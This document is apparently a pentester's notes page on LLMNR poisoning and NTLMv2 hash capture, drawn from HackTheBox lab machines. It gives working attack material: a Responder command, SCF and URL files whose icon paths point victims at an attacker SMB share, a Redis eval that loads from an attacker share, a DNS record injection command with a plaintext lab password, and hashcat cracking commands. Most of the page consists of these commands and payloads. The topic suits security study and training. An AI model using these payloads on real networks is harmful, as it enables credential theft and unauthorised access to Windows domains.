# LLMNR Poisoning

We basically poison DNS so that whenever the router does not know where to forward a connection to, it will forward it to us.&#x20;

### Responder:

```python
responder -I <tun0> -dw

##This will capture NTMLv2 Hashes that can cracked with hashcat.
```

Different strategies to get NTLMv2 Hashes:&#x20;

If there is anywhere where we can upload a file and they allow .scf files it means we can replace the file to callback to our SMB share being hosted by Responder which we can then crack.

#### SCF files and URL files:&#x20;

SCF:

```python
[Shell]
Command=2
IconFile=\\10.10.16.5\home\kali\driver.scf
[Taskbar]
Command=ToggleDesktop
```

URL:

```python
batcat not-virus.url
───────┬─────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: not-virus.url
───────┼─────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ [InternetShortcut]
   2   │ URL=anything
   3   │ WorkingDirectory=anything
   4   │ IconFile=\\192.168.49.100\%USERNAME%.icon
   5   │ IconIndex=1
───────┴─────────────────────────────────────────────────────────────────────────────────────────────────────────────
```

Notice the SMB share, we should switch the IP to the corresponding one.&#x20;

#### SSRF + Responder

Server-Side request forgery, allows an attacker to "induce" the application to make requests to places that it was intended to.&#x20;

![](<../../../.gitbook/assets/image (62).png>)

Here the application was some sort of Web Browser that allowed us intercept the traffic by pointing the website to make a request to our webserver using Responder.&#x20;

![](<../../../.gitbook/assets/image (64).png>)

Notice that when we provided the application with the url of our webserver on port 80 (ofc since https is encrypted we wont be able to do this). We were able to take advantage of the SSRF.&#x20;

#### Redis

```python
redis-cli -h VICTIM-p 6379 eval "dofile('//10.6.114.131//share')" 0
```

Same concept here, if we can point redis to point to our SMB share we will be able to capture hashes as well.&#x20;

#### Poisoning DNS and Default Cred Web request

During the machine called Intelligence from HackTheBox I was able to capture a hash because the user was making a request to all the websevers that started with the word "web"

More of the script that the user was using to authenticate was this:

```
──────┬───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: downdetector.ps1   <UTF-16LE>
───────┼───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ # Check web server status. Scheduled to run every 5min
   2   │ Import-Module ActiveDirectory 
   3   │ foreach($record in Get-ChildItem "AD:DC=intelligence.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=intelligence,DC=htb" | Where-Object Name -like "web*")  {
   4   │ try {
   5   │ $request = Invoke-WebRequest -Uri "http://$($record.Name)" -UseDefaultCredentials
   6   │ if(.StatusCode -ne 200) {
   7   │ Send-MailMessage -From 'Ted Graves <Ted.Graves@intelligence.htb>' -To 'Ted Graves <Ted.Graves@intelligence.htb>' -Subject "Host: $($record.Name) is down"
   8   │ }
   9   │ } catch {}
  10   │ }

```

We can use the requests its making to the webservers that start with the name web\*

If we have valid credentials to the domain we can start our own and poison dns so that our own webserver starts with that name and we can capture the hash of the user Ted Graves.

![](../../../.gitbook/assets/2022-08-20\_15-22.png)![](<../../../.gitbook/assets/2022-08-20\_15-20 (1).png>)

```
// python3 dnstool.py -u 'intelligence.htb\Tiffany.Molina' -p NewIntelligenceCorpUser9876 -r weblyethar -a add -t A -d 10.10.14.7 10.10.10.248
```

Notice that the -d is for us to provide our IP and then the IP of our target.&#x20;



### Cracking NTLMv2&#x20;

```python
hashcat -m 5600 ntlmhash.txt /usr/share/wordlists/rockyou.txt --force
```

hashcat -m 5600 hash.txt rockyou.txt -r rules/OneRuleToRuleThemAll.rule --debug-mode=1 --debug-file=matched.rule

<details>

<summary>Examples of LLMNR Poisoning and Responder Action.</summary>

[https://app.gitbook.com/s/8orEMrbW2JUz78N6Vl5G/enumeration/web-services](https://app.gitbook.com/s/8orEMrbW2JUz78N6Vl5G/enumeration/web-services) (Heist)

Driver HTB

</details>
